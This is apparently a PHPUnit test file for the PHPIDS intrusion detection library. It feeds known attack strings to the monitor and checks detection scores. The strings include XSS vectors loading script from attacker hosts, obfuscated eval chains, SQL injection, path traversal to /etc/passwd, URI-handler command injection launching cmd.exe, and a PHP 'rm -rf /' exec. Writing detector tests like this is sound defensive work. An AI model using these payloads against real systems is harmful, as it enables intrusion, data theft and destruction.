<?php

/**
 * PHPIDS
 *
 * Requirements: PHP5, SimpleXML
 *
 * Copyright (c) 2007 PHPIDS (http://php-ids.org)
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; version 2 of the license.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * @version	$Id$
 */

require_once 'PHPUnit/Framework/TestCase.php';
set_include_path(get_include_path() . PATH_SEPARATOR . dirname(__FILE__) . '/../../lib');
require_once 'IDS/Monitor.php';
require_once 'IDS/Filter/Storage.php';

class IDS_MonitorTest extends PHPUnit_Framework_TestCase {

	public function setUp()
	{
		$this->storage = new IDS_Filter_Storage();
		$this->storage->getFilterFromXML(dirname(__FILE__) . '/../../lib/IDS/default_filter.xml');
	}

	public function testRunWithTags() {
		$test = new IDS_Monitor(
			array('user' => 'admin<script/src=http/attacker.com>'),
			$this->storage,
			array('csrf')
		);

		$result = $test->run();

		foreach ($result->getEvent('user')->getFilters() as $filter) {
			$this->assertTrue(in_array('csrf', $filter->getTags()));
		}
	}

	public function testRun() {
		$test = new IDS_Monitor(
			array(
				'id' 	=> '9<script/src=http/attacker.com>',
				'name' 	=> '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="'
			),
			$this->storage
		);

		$result = $test->run();

		$this->assertTrue($result->hasEvent('id'));
		$this->assertTrue($result->hasEvent('name'));
	}

	public function testNoResult() {
		$test = new IDS_Monitor(array('test', 'bla'), $this->storage);
		$this->assertTrue($test->run()->isEmpty());
	}

    public function testSetExceptionsString()
    {
        $test = new IDS_Monitor(array('test', 'bla'), $this->storage);
        $exception = 'test1';
        $test->setExceptions($exception);
        $result = $test->getExceptions();
        $this->assertEquals($exception, $result[0]);                    
    }

    public function testSetExceptionsArray()
    {
        $test = new IDS_Monitor(array('test', 'bla'), $this->storage);
        $exceptions = array('test1', 'test2');
        $test->setExceptions($exceptions);
        $this->assertEquals($exceptions, $test->getExceptions());                    
    }

	public function testList()
	{
		$test = new IDS_Monitor(
			array('9<script/src=http/attacker.com>', 
                  '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="'),
			$this->storage
		);
		$result = $test->run();
		$this->assertTrue($result->hasEvent(1));
		$this->assertEquals(16, $result->getImpact());
	}

    public function testListWithKeyScanning()
    {
        $test = new IDS_Monitor(
            array('test1' => '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="',
                  'test2' => '9<script/src=http/attacker.com>', 
                  '9<script/src=http/attacker.com>' => '9<script/src=http/attacker.com>'  
                ),
            $this->storage
        );
        $test->scanKeys = true;
        $result = $test->run();
        $this->assertEquals(22, $result->getImpact());
    }

    public function testListWithException()
    {
        $test = new IDS_Monitor(
            array('9<script/src=http/attacker.com>', 
                  '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="'),
            $this->storage
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(16, $result->getImpact());
    }

    public function testListWithSubKeys()
    {
        $exploits = array('9<script/src=http/attacker.com>');
        $exploits[] = array('" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="');
        $exploits[] = array('9<script/src=http/attacker.com>');
        
        $test = new IDS_Monitor(
            $exploits,                   
            $this->storage
        );
        $result = $test->run();
        $this->assertEquals(22, $result->getImpact());
    }

    public function testListWithSubKeysAndExceptions()
    {
        $exploits = array('test1' => '9<script/src=http://attacker.com>');
        $exploits[] = array('" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="');
        $exploits[] = array('9<script/src=http/attacker.com>');
        
        $test = new IDS_Monitor(
            $exploits,                   
            $this->storage
        );
        $test->setExceptions('test1');
        $result = $test->run();
        $this->assertEquals(16, $result->getImpact());
    }

    public function testXSSList() {
        $test = new IDS_Monitor(
            array('\'\'"--><script>eval(String.fromCharCode(88,83,83)));%00', 
                  '"></a style="xss:ex/**/pression(alert(1));"',
                  'top.__proto__._= alert
                    _(1)',
                  'document.__parent__._=alert
                    _(1)'
                  ),
            $this->storage
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        
        $this->assertEquals(99, $result->getImpact());        
    }

    public function testSelfContainedXSSList() {
        $test = new IDS_Monitor(
            array('a=0||\'ev\'+\'al\',b=0||1[a](\'loca\'+\'tion.hash\'),c=0||\'sub\'+\'str\',1[a](b[c](1));', 
                  'eval.call(this,unescape.call(this,location))',
                  'd=0||\'une\'+\'scape\'||0;a=0||\'ev\'+\'al\'||0;b=0||\'locatio\';b+=0||\'n\'||0;c=b[a];d=c(d);c(d(c(b)))',
                  '_=eval,__=unescape,___=document.URL,_(__(___))', 
                  '$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))', 
                  'y=<a>alert</a>;content[y](123)', 
                  '$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)', 
                  'eval.call(this,unescape.call(this,location))', 
                  'setTimeout//
                    (name//
                    ,0)//', 
                  'a=/ev/ 
                    .source
                    a+=/al/ 
                    .source,a = a[a]
                    a(name)'
                  ),
            $this->storage
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(226, $result->getImpact());        
    }

    public function testSQLIList() {
        $test = new IDS_Monitor(
            array('" OR 1=1#', 
                  '; DROP table Users --', 
                  '/**/S/**/E/**/L/**/E/**/C/**/T * FROM users WHERE 1 = 1',
                  'admin\'--', 
                  'SELECT /*!32302 1/0, */ 1 FROM tablename', 
                  '10;DROP members --', 
                  ' SELECT IF(1=1,\'true\',\'false\')', 
                  'SELECT CHAR(0x66)', 
                  'SELECT LOAD_FILE(0x633A5C626F6F742E696E69)', 
                  'EXEC(@stored_proc @param)', 
                  'chr(11)||chr(12)||char(13)', 
                  'MERGE INTO bonuses B USING (SELECT'
                  ),
            $this->storage
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(110, $result->getImpact());        
    }
    
    public function testDTList(){
        $test1 = '../../etc/passwd';
        $test2 = '\%windir%\cmd.exe';
        if(get_magic_quotes_gpc()){
            $test1 = addslashes($test1);
            $test2 = addslashes($test2);
        }        
        $test = new IDS_Monitor(
            array($test1, $test2),
            $this->storage
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(20, $result->getImpact());        
    }

    public function testURIList(){
        $test = new IDS_Monitor(
            array('firefoxurl:test|"%20-new-window%20file:\c:/test.txt',
                  'firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"',
                  'aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"',
                  'aim:///#1111111/11111111111111111111111111111111111111111111111111111111111112222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222226666666AAAABBBB6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666',
                  'navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)',  
                  'res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210', 
                  'mailto:%00%00../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat', 
                  'nntp:%00%00../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat', 
                  'news:%00%00../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat', 
                  'snews:%00%00../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat', 
                  'telnet:%00%00../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat'
                  ),
            $this->storage
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(238, $result->getImpact());          
    }    
    
    public function testRFEList() {
        $test = new IDS_Monitor(
            array(';phpinfo()', '"; <?php exec("rm -rf /"); ?>'),
            $this->storage
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(29, $result->getImpact());       
    }

    public function testDecimalCCConverter() {
        $test = new IDS_Monitor(
            array('&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#32;&#108;&#97;&#110;&#103;&#117;&#97;&#103;&#101;&#61;&#34;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#62;&#32;&#10;&#47;&#47;&#32;&#67;&#114;&#101;&#97;&#109;&#111;&#115;&#32;&#108;&#97;&#32;&#99;&#108;&#97;&#115;&#101;&#32;&#10;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#32;&#41;&#32;&#123;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#250;&#98;&#108;&#105;&#99;&#111;&#32;&#105;&#110;&#105;&#99;&#105;&#97;&#108;&#105;&#122;&#97;&#100;&#111;&#32;&#97;&#32;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#32;&#10;&#32;&#116;&#104;&#105;&#115;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#39;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#114;&#105;&#118;&#97;&#100;&#111;&#32;&#112;&#97;&#114;&#97;&#32;&#101;&#108;&#32;&#111;&#98;&#106;&#101;&#116;&#111;&#32;&#119;&#105;&#110;&#100;&#111;&#119;&#32;&#10;&#32;&#118;&#97;&#114;&#32;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#117;&#108;&#108;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#46;&#46;&#46;&#32;&#10;&#125;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#101;&#119;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#41;&#59;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#112;&#114;&#111;&#103;&#114;&#97;&#109;&#97;&#99;&#105;&#111;&#110;&#119;&#101;&#98;&#46;&#110;&#101;&#116;&#47;&#39;&#59;&#32;&#10;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#32;&#10;&#32;', 
                  '60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62'),
            $this->storage
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(53, $result->getImpact());              
    }

    public function testOctalCCConverter() {
        $test1 = 'XXX';
        $test2 = '\74\163\143\162\151\160\164\76\141\154\145\162\164\50\47\150\151\47\51\74\57\163\143\162\151\160\164\76';
        if(get_magic_quotes_gpc()){
            $test1 = addslashes($test1);
            $test2 = addslashes($test2);
        }        
        $test = new IDS_Monitor(
            array($test1, $test2),
            $this->storage
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(34, $result->getImpact());              
    }

    public function testHexCCConverter() {
        $test1 = ';&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x22;&#x3e;&#x20;&#x0a;&#x2f;&#x2f;&#x20;&#x43;&#x72;&#x65;&#x61;&#x6d;&#x6f;&#x73;&#x20;&#x6c;&#x61;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x65;&#x20;&#x0a;&#x66;&#x75;&#x6e;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x70;&#x6f;&#x70;&#x75;&#x70;&#x20;&#x28;&#x20;&#x29;&#x20;&#x7b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x41;&#x74;&#x72;&#x69;&#x62;&#x75;&#x74;&#x6f;&#x20;&#x70;&#xfa;&#x62;&#x6c;&#x69;&#x63;&#x6f;&#x20;&#x69;&#x6e;&#x69;&#x63;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#x61;&#x64;&#x6f;&#x20;&#x61;&#x20;&#x61;&#x62;&#x6f;&#x75;&#x74;&#x3a;&#x62;&#x6c;&#x61;&#x6e;&#x6b;&#x20;&#x0a;&#x20;&#x74;&#x68;&#x69;&#x73;&#x2e;&#x75;&#x72;&#x6c;&#x20;&#x3d;&#x20;&#x27;&#x61;&#x62;&#x6f;&#x75;&#x74;&#x3a;&#x62;&#x6c;&#x61;&#x6e;&#x6b;&#x27;&#x3b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x41;&#x74;&#x72;&#x69;&#x62;&#x75;&#x74;&#x6f;&#x20;&#x70;&#x72;&#x69;&#x76;&#x61;&#x64;&#x6f;&#x20;&#x70;&#x61;&#x72;&#x61;&#x20;&#x65;&#x6c;&#x20;&#x6f;&#x62;&#x6a;&#x65;&#x74;&#x6f;&#x20;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;&#x20;&#x0a;&#x20;&#x76;&#x61;&#x72;&#x20;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x20;&#x3d;&#x20;&#x6e;&#x75;&#x6c;&#x6c;&#x3b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x2e;&#x2e;&#x2e;&#x20;&#x0a;&#x7d;&#x20;&#x0a;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x70;&#x6f;&#x70;&#x75;&#x70;&#x20;&#x28;&#x29;&#x3b;&#x20;&#x0a;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x2e;&#x75;&#x72;&#x6c;&#x20;&#x3d;&#x20;&#x27;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x70;&#x72;&#x6f;&#x67;&#x72;&#x61;&#x6d;&#x61;&#x63;&#x69;&#x6f;&#x6e;&#x77;&#x65;&#x62;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x27;&#x3b;&#x20;&#x0a;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x20;&#x0a;&#x20;';
        $test2 = '\x0000003c\x0000073\x0000063\x0000072\x0000069\x0000070\x0000074\x000003e\x0000061\x000006c\x0000065\x0000072\x0000074\x0000028\x0000032\x0000029\x000003c\x000002f\x0000073\x0000063\x0000072\x0000069\x0000070\x0000074\x000003e';
        if(get_magic_quotes_gpc()){
            $test1 = addslashes($test1);
            $test2 = addslashes($test2);
        } 
        $test = new IDS_Monitor(
            array($test1, $test2),
            $this->storage
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(58, $result->getImpact());              
    }
    
    public function testXMLFilterString()
    {
        $this->storage = new IDS_Filter_Storage();
        $this->storage->getFilterFromXML(file_get_contents(dirname(__FILE__) . '/../../lib/IDS/default_filter.xml'));
    }
}